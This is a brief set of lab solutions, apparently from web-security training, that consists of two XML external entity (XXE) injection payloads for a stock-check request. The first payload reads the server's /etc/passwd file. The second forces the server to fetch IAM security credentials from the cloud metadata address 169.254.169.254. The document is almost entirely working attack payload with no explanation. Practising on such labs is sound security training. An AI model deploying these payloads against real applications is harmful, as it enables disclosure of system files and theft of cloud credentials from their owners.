```xml-dtd
#Lab 1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> ##Solution
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

```xml-dtd
#Lab 2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> ##Solut
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

